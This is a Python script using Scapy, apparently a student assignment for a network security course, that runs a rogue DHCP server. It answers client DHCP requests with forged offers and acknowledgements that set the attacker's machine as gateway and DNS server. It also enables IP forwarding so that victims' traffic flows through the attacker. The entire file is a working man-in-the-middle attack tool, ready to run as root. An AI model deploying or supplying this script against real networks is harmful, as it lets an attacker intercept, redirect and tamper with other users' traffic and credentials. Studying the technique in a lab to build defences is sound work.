#!/usr/bin/env python3
# =============================================================
# Script   : DHCP Spoofing Attack
# Autor    : Yeury Lopez
# Matricula: 2025-0780
# Materia  : Seguridad de Redes
# =============================================================

from scapy.all import *
import time
import os
import sys
import random

# -------------------------------------------------------------
# CONFIGURACIÓN DEL SERVIDOR DHCP FALSO
# -------------------------------------------------------------
INTERFAZ        = "eth0"           # Interfaz de Kali
KALI_IP         = "172.25.78.10"   # IP de Kali (atacante)
FAKE_GATEWAY    = "172.25.78.10"   # Gateway falso (Kali)
FAKE_DNS        = "172.25.78.10"   # DNS falso (Kali)
SUBNET_MASK     = "255.255.255.0"  # Máscara de red
LEASE_TIME      = 3600             # Tiempo de lease (1 hora)

# Pool de IPs falso para asignar a víctimas
IP_POOL = [f"172.25.78.{i}" for i in range(150, 200)]
ip_index = 0  # Contador para asignar IPs del pool

# Diccionario para rastrear asignaciones
asignaciones = {}

# -------------------------------------------------------------
# FUNCIÓN: Obtener siguiente IP del pool falso
# -------------------------------------------------------------
def get_next_ip():
    global ip_index
    ip = IP_POOL[ip_index % len(IP_POOL)]
    ip_index += 1
    return ip

# -------------------------------------------------------------
# FUNCIÓN: Manejar paquetes DHCP entrantes
# -------------------------------------------------------------
def handle_dhcp(pkt):
    global asignaciones

    # Verificar que es un paquete DHCP
    if not pkt.haslayer(DHCP):
        return

    # Obtener tipo de mensaje DHCP
    dhcp_type = None
    for opt in pkt[DHCP].options:
        if opt[0] == 'message-type':
            dhcp_type = opt[1]
            break

    # Obtener MAC del cliente
    client_mac = pkt[Ether].src

    # -------------------------------------------------------
    # Responder a DHCP Discover con DHCP Offer
    # -------------------------------------------------------
    if dhcp_type == 1:  # DHCP Discover
        print(f"\n[→] DHCP Discover recibido de {client_mac}")

        # Asignar IP del pool falso
        offered_ip = get_next_ip()
        asignaciones[client_mac] = offered_ip

        print(f"[←] Enviando DHCP Offer:")
        print(f"    IP ofrecida : {offered_ip}")
        print(f"    Gateway     : {FAKE_GATEWAY} (FALSO)")
        print(f"    DNS         : {FAKE_DNS} (FALSO)")

        # Construir DHCP Offer
        offer = (
            Ether(src=get_if_hwaddr(INTERFAZ), dst=client_mac) /
            IP(src=KALI_IP, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,
                yiaddr=offered_ip,
                siaddr=KALI_IP,
                chaddr=bytes.fromhex(
                    client_mac.replace(':', '')
                ) + b'\x00' * 10,
                xid=pkt[BOOTP].xid
            ) /
            DHCP(options=[
                ("message-type", "offer"),
                ("server_id", KALI_IP),
                ("lease_time", LEASE_TIME),
                ("subnet_mask", SUBNET_MASK),
                ("router", FAKE_GATEWAY),
                ("name_server", FAKE_DNS),
                "end"
            ])
        )

        sendp(offer, iface=INTERFAZ, verbose=False)
        print(f"[✓] DHCP Offer enviado a {client_mac}")

    # -------------------------------------------------------
    # Responder a DHCP Request con DHCP ACK
    # -------------------------------------------------------
    elif dhcp_type == 3:  # DHCP Request
        print(f"\n[→] DHCP Request recibido de {client_mac}")

        # Obtener IP previamente asignada
        assigned_ip = asignaciones.get(client_mac, get_next_ip())

        print(f"[←] Enviando DHCP ACK:")
        print(f"    IP asignada : {assigned_ip}")
        print(f"    Gateway     : {FAKE_GATEWAY} (FALSO)")

        # Construir DHCP ACK
        ack = (
            Ether(src=get_if_hwaddr(INTERFAZ), dst=client_mac) /
            IP(src=KALI_IP, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,
                yiaddr=assigned_ip,
                siaddr=KALI_IP,
                chaddr=bytes.fromhex(
                    client_mac.replace(':', '')
                ) + b'\x00' * 10,
                xid=pkt[BOOTP].xid
            ) /
            DHCP(options=[
                ("message-type", "ack"),
                ("server_id", KALI_IP),
                ("lease_time", LEASE_TIME),
                ("subnet_mask", SUBNET_MASK),
                ("router", FAKE_GATEWAY),
                ("name_server", FAKE_DNS),
                "end"
            ])
        )

        sendp(ack, iface=INTERFAZ, verbose=False)
        print(f"[✓] DHCP ACK enviado → {client_mac} "
              f"tiene IP {assigned_ip}")

# -------------------------------------------------------------
# FUNCIÓN PRINCIPAL: Ejecutar el ataque
# -------------------------------------------------------------
def dhcp_spoofing():

    print("=" * 55)
    print("   DHCP SPOOFING ATTACK")
    print("   Autor    : Yeury Lopez")
    print("   Matricula: 2025-0780")
    print("=" * 55)
    print(f"\n[*] Interfaz     : {INTERFAZ}")
    print(f"[*] IP atacante  : {KALI_IP}")
    print(f"[*] Gateway falso: {FAKE_GATEWAY}")
    print(f"[*] DNS falso    : {FAKE_DNS}")
    print(f"[*] Pool falso   : 172.25.78.150-199")
    print(f"[*] Inicio       : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"\n[!] Esperando solicitudes DHCP...")
    print(f"[!] Presiona CTRL+C para detener")
    print("-" * 55)

    try:
        # Escuchar solo paquetes DHCP (puerto 67 y 68)
        sniff(
            iface=INTERFAZ,
            filter="udp and (port 67 or port 68)",
            prn=handle_dhcp,
            store=0
        )

    except KeyboardInterrupt:
        print(f"\n[!] Servidor DHCP falso detenido")
        print(f"\n[*] Resumen de asignaciones:")
        for mac, ip in asignaciones.items():
            print(f"    {mac} → {ip}")
        print("=" * 55)

# -------------------------------------------------------------
# PUNTO DE ENTRADA
# -------------------------------------------------------------
if __name__ == "__main__":

    if os.getuid() != 0:
        print("[!] ERROR: Ejecuta como root (sudo)")
        sys.exit(1)

    # Habilitar IP Forwarding para que el tráfico fluya
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding habilitado")

    dhcp_spoofing()
